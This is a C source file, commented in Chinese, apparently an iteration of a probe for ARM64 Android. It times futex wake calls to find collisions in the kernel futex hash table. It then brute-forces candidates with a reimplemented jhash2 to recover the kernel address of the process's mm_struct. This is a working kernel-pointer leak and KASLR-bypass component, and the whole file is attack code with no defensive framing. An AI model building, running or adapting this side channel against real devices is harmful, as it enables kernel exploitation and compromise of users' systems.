/* e2e2_probe.c - G1∧G2 端到端 v2（含 hashsize=2048 精确判定 + 双窗口 + 32 全网格）
 *
 * 相对 e2e_probe 的修正/增强：
 *  1. 打印并持久化 region 基址与 inc 地址（run2 缺失导致 G2 无法含 target 方程）
 *  2. hashsize 已由 /sys/devices/system/cpu/possible=0-7 确认（256×8→2048 pow2）
 *     → 判据用 mask-2048 精确条件（13 地址全等，FP ~0），mask-256 兜底
 *  3. G2 在设备端覆盖：双窗口 × 结构性网格；修正窗口 × 全 32 字节网格（~20s）
 *  4. 全量扫描 32768 候选并统计命中率（hit rate ≈ 1/hashsize，独立校验 hashsize）
 *  5. 命中后做 mask-2048 预测命中率验证（正确 mm 应 ~100%）
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <time.h>
#include <inttypes.h>

#define PAGE             4096
#define REGION_PAGES     65536
#define REGION_SZ        ((size_t)REGION_PAGES * PAGE)
#define WAITERS          256
#define REPEAT           32
#define AVG_N            8
#define TARGET_ID        128
#define SCAN_PAGES       32768
#define NR_G2_THREADS    4
#define VERIF_PER_H      200

static volatile uint8_t *region;
static volatile uint32_t *inc_futex;
static volatile int g_stop = 0;
static volatile int g_pause = 0;
static uint64_t g_hits[64];
static int g_nhits = 0;
static uint64_t g_baseline;
static FILE *out;

static inline uint64_t rdtsc(void) {
    uint64_t v;
    __asm__ volatile("isb" ::: "memory");
    __asm__ volatile("mrs %0, cntvct_el0" : "=r"(v));
    __asm__ volatile("isb" ::: "memory");
    return v;
}
static int futex_op(uint32_t *u, int op, uint32_t val, const struct timespec *to) {
    return (int)syscall(SYS_futex, u, op, val, to, NULL, 0);
}

/* ---- jhash2 (mainline 4.9, 与 tools/ksnitch_local_check.py 及反汇编逐字对齐) ---- */
static inline uint32_t rol32(uint32_t w, unsigned s) { return (w << s) | (w >> (32 - s)); }
static inline void jmix(uint32_t *a, uint32_t *b, uint32_t *c) {
    *a -= *c; *a ^= rol32(*c, 4);  *c += *b;
    *b -= *a; *b ^= rol32(*a, 6);  *a += *c;
    *c -= *b; *c ^= rol32(*b, 8);  *b += *a;
    *a -= *c; *a ^= rol32(*c, 16); *c += *b;
    *b -= *a; *b ^= rol32(*a, 19); *a += *c;
    *c -= *b; *c ^= rol32(*b, 4);  *b += *a;
}
static inline void jfinal(uint32_t *a, uint32_t *b, uint32_t *c) {
    *c ^= *b; *c -= rol32(*b, 14);
    *a ^= *c; *a -= rol32(*c, 11);
    *b ^= *a; *b -= rol32(*a, 25);
    *c ^= *b; *c -= rol32(*b, 16);
    *a ^= *c; *a -= rol32(*c, 4);
    *b ^= *a; *b -= rol32(*a, 14);
    *c ^= *b; *c -= rol32(*b, 24);
}
static uint32_t jhash2(const uint32_t *k, uint32_t length, uint32_t initval) {
    uint32_t a, b, c;
    a = b = c = 0xdeadbeefu + (length << 2) + initval;
    while (length > 3) {
        a += k[0]; b += k[1]; c += k[2];
        jmix(&a, &b, &c);
        length -= 3; k += 3;
    }
    switch (length) {
    case 3: c += k[2]; /* fallthrough */
    case 2: b += k[1]; /* fallthrough */
    case 1: a += k[0]; jfinal(&a, &b, &c); break;
    }
    return c;
}
static uint32_t hash_from(uint64_t addr_va, uint64_t mm, uint32_t hsz) {
    uint64_t page = addr_va & ~0xfffULL;
    uint32_t k[4] = { (uint32_t)mm, (uint32_t)(mm >> 32),
                      (uint32_t)page, (uint32_t)(page >> 32) };
    return jhash2(k, 4, (uint32_t)(addr_va & 0xfff)) & (hsz - 1);
}

static void *waiter_thread(void *arg) {
    (void)arg;
    struct timespec ts = { .tv_sec = 2, .tv_nsec = 0 };
    while (!g_stop) {
        if (g_pause) { usleep(20000); continue; }
        futex_op((uint32_t *)inc_futex, FUTEX_WAIT_PRIVATE, *inc_futex, &ts);
        usleep(1000);
    }
    return NULL;
}

static uint64_t measure(uint32_t *addr) {
    uint64_t s[REPEAT];
    for (int i = 0; i < REPEAT; i++) {
        uint64_t t0 = rdtsc();
        futex_op(addr, FUTEX_WAKE_PRIVATE, 1, NULL);
        uint64_t t1 = rdtsc();
        s[i] = t1 - t0;
    }
    for (int i = 0; i < REPEAT; i++)
        for (int j = i + 1; j < REPEAT; j++)
            if (s[j] < s[i]) { uint64_t x = s[i]; s[i] = s[j]; s[j] = x; }
    uint64_t sum = 0;
    for (int i = 0; i < AVG_N; i++) sum += s[i];
    return sum / AVG_N;
}

static void pause_crowd(void) {
    g_pause = 1;
    futex_op((uint32_t *)inc_futex, FUTEX_WAKE_PRIVATE, 0x7fffffff, NULL);
    usleep(300000);
}
static void resume_crowd(void) {
    g_pause = 0;
    usleep(200000);
}

/* ---- G2 ---- */
#define SLAB_PAGE 16384
#define OBJS_PER_SLAB 18
static uint64_t g_strict[64]; static int g_nstrict = 0;

static void g2_check(uint64_t c, uint32_t mask) {
    uint32_t h0 = hash_from((uint64_t)(uintptr_t)inc_futex, c, mask);
    for (int i = 0; i < g_nhits; i++)
        if (hash_from(g_hits[i], c, mask) != h0) return;
    if (g_nstrict < 64) g_strict[g_nstrict++] = c;
}

typedef struct { uint64_t start, end; } range_t;
static void *g2_worker(void *arg) {
    range_t *r = (range_t *)arg;
    for (uint64_t base = r->start; base < r->end; base += SLAB_PAGE)
        for (int j = 0; j < OBJS_PER_SLAB; j++)
            g2_check(base + (uint64_t)j * 896, 2048);
    return NULL;
}
static void *g2_worker32(void *arg) {
    range_t *r = (range_t *)arg;
    for (uint64_t c = r->start; c < r->end; c += 32)
        g2_check(c, 2048);
    return NULL;
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    char outpath[128]; snprintf(outpath, sizeof(outpath), "/data/local/tmp/ks_wide_%d.txt", (int)getpid());
    out = fopen(outpath, "w");
    uint64_t t_all0 = rdtsc();
    pthread_t tids[WAITERS];

    region = mmap(NULL, REGION_SZ, PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);
    if (region == MAP_FAILED) { perror("mmap"); return 2; }
    memset((void *)region, 0, REGION_SZ);
    inc_futex = (volatile uint32_t *)(region + TARGET_ID);
    uint64_t inc_va = (uint64_t)(uintptr_t)inc_futex;
    printf("region=%p inc=%016" PRIx64 "\n", (void *)region, inc_va);
    fprintf(out, "region %p\ninc %016" PRIx64 "\n", (void *)region, inc_va);

    for (int i = 0; i < WAITERS; i++)
        if (pthread_create(&tids[i], NULL, waiter_thread, NULL) != 0) {
            printf("pthread_create FAIL %d\n", i);
            g_stop = 1;
            for (int k = 0; k < i; k++) pthread_join(tids[k], NULL);
            return 3;
        }
    usleep(500000);

    uint64_t b1 = measure((uint32_t *)(region + PAGE));
    uint64_t b2 = measure((uint32_t *)(region + PAGE + 8));
    g_baseline = b1 < b2 ? b1 : b2;
    uint64_t t_meas = measure((uint32_t *)inc_futex);
    printf("baseline=%" PRIu64 " inc=%" PRIu64 "\n", g_baseline, t_meas);
    fprintf(out, "baseline %" PRIu64 "\ninc_meas %" PRIu64 "\n", g_baseline, t_meas);

    /* 全量扫描：统计所有 hit（rate ≈ 1/hashsize） */
    int scanned = 0, all_hits = 0;
    for (int i = 1; i < SCAN_PAGES; i++) {
        uint32_t *addr = (uint32_t *)(region + (size_t)i * PAGE + ((i * 8) % PAGE));
        if (addr == (uint32_t *)inc_futex) continue;
        uint64_t t = measure(addr);
        scanned++;
        if (t > g_baseline * 10) {
            all_hits++;
            if (g_nhits < 64) { g_hits[g_nhits++] = (uint64_t)(uintptr_t)addr; }
            if (all_hits <= 40)
                printf("  hit[%d] %p ticks=%" PRIu64 "\n", all_hits, (void *)addr, t);
        }
    }
    printf("scan: %d candidates, %d hits (rate 1/%.0f -> hashsize est)\n",
           scanned, all_hits, (double)scanned / (all_hits ? all_hits : 1));
    fprintf(out, "scan %d %d\n", scanned, all_hits);
    for (int i = 0; i < g_nhits; i++)
        fprintf(out, "hit %d %016" PRIx64 "\n", i, g_hits[i]);

    /* 暂停校验 */
    pause_crowd();
    int nreal = 0;
    for (int i = 0; i < g_nhits; i++) {
        uint64_t t = measure((uint32_t *)(uintptr_t)g_hits[i]);
        int hot = t > g_baseline * 5;
        if (!hot) g_hits[nreal++] = g_hits[i];
        fprintf(out, "pausecheck %d %d %" PRIu64 "\n", i, hot, t);
    }
    g_nhits = nreal;
    resume_crowd();
    printf("real hits = %d\n", g_nhits);
    fprintf(out, "realhits %d\n", g_nhits);
    if (g_nhits < 5) { printf("FAIL: <5 real hits\n"); goto cleanup; }

    /* G2-wide: structural grid over [0xffffffc000000000, +128GB) */
    {
        enum { NT = 8 };
        pthread_t g2t[NT];
        range_t r[NT];
        const uint64_t base0 = 0xffffffc000000000ULL;
        uint64_t span = (128ULL << 30) / NT;
        g_nstrict = 0;
        for (int k = 0; k < NT; k++) {
            r[k].start = base0 + span * k;
            r[k].end = base0 + span * (k + 1);
            pthread_create(&g2t[k], NULL, g2_worker, &r[k]);
        }
        for (int k = 0; k < NT; k++) pthread_join(g2t[k], NULL);
        printf("G2 wide[0x%016llx,+128GB]: strict(mask-2048) = %d\n",
               (unsigned long long)base0, g_nstrict);
        for (int i = 0; i < g_nstrict && i < 8; i++)
            printf("  0x%016" PRIx64, g_strict[i]);
        printf("\n");
        for (int i = 0; i < g_nstrict && i < 32; i++)
            fprintf(out, "strictw %d %016" PRIx64 "\n", i, g_strict[i]);
    }

    /* 验证：用首个候选做 mask-2048 预测命中率（正确 mm 应 ~100%） */
    if (g_nstrict) {
        uint64_t mm = g_strict[0];
        fprintf(out, "recovered_mm %016" PRIx64 "\n", mm);
        uint32_t B = hash_from(inc_va, mm, 2048);
        int tested = 0, hotn = 0;
        for (int p = 33000; p < REGION_PAGES && tested < VERIF_PER_H; p++)
            for (int off = 8; off < PAGE && tested < VERIF_PER_H; off += 128) {
                uint64_t va = (uint64_t)(uintptr_t)(region + (size_t)p * PAGE + off);
                if (hash_from(va, mm, 2048) != B) continue;
                uint64_t t = measure((uint32_t *)(uintptr_t)va);
                if (t > g_baseline * 10) hotn++;
                tested++;
            }
        printf("VERIFY mm=%016" PRIx64 ": predicted=%d hot=%d rate=%.1f%%\n",
               mm, tested, hotn, tested ? 100.0 * hotn / tested : 0.0);
        fprintf(out, "verify %d %d\n", tested, hotn);
    }
    if (g_nstrict) {
        printf("MM %016" PRIx64 "\n", g_strict[0]);
        fflush(stdout);
        fprintf(out, "MM %016" PRIx64 "\n", g_strict[0]);
        fflush(out);
    } else {
        printf("MM NONE\n");
        fflush(stdout);
    }

    printf("elapsed %.1f s\n", (double)(rdtsc() - t_all0) / 19200000.0);
cleanup:
    g_stop = 1;
    futex_op((uint32_t *)inc_futex, FUTEX_WAKE_PRIVATE, 0x7fffffff, NULL);
    for (int i = 0; i < WAITERS; i++) pthread_join(tids[i], NULL);
    munmap((void *)region, REGION_SZ);
    fclose(out);
    printf("cleanup done\n");
    fflush(stdout);
    if (argc > 1 && strcmp(argv[1], "--hold") == 0) {
        for (;;) pause();
    }
    return 0;
}
